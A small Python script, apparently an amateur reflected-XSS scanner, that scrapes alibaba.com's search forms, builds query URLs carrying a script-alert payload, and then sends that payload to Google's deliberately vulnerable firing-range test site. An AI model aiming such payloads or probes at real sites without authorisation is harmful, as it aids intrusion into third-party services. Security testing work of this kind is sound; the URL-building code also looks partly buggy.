from bs4 import BeautifulSoup
import requests

#sinon fonctionne pas request timeout
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36',
}

url='https://www.alibaba.com/'

#https://www.leboncoin.fr/

r = requests.get(url, timeout=5, headers=HEADERS)
urlT = url.split('//')
page = r.content
p = page.decode("UTF-8")

soup = BeautifulSoup(p)
form = soup.find_all("form")
print(form)
role="null"
data= "null"
clas="null"
action="null"
i="null"
tab = ["search" , "recherche" , "rech" , "results" , "resultats" , "query" , "twotabsearchtextbox"]
req = ''
payload="<script>alert('ok')</script>"

for e in form:
	for o in tab:
		if e.get("role"):
			role = e.get("role")
		if e.get("action"):
			action= e.get("action")
		if e.get("id"):
			i= e.get("id")
		if e.get("data-testid"):
			data= e.get("data-testid")
		if e.get("class"):
			clas= e.get("class")
		if o in role or o in clas or o in data  or o in i or o in action:
			#recuperer le action= du form
			z = e.get("action")
			z = z[1:]
			#recuperer tout les input du form
			a = e.findAll("input")
			if urlT[1] in z:
				req =  'https:/' +z + "?"
			else:
				req = url +  z + "?"
			
			for b in a:
				#recuperer le name= du input
				if b.get("name"):
					if b.get('value'):
						if b.get('value') == '':
							req =  req + b.get("name") + "=" + payload
						else :
							req =  req + b.get("name") + "=" + b.get('value')+ "&"
					else:

						req =  req + b.get("name") + "=" + payload



r= req.split('//')

if len(r) > 1:
    r[1] = 'https://' + r[1]
    print(r[1])
else:
    print(req)


req2 = 'https://public-firing-range.appspot.com/reflected/parameter/body?q=' + payload

r2 = requests.get(req2)

page2 = r2.content
p2 = page2.decode("UTF-8")

soup2 = BeautifulSoup(p2)



print(soup2)


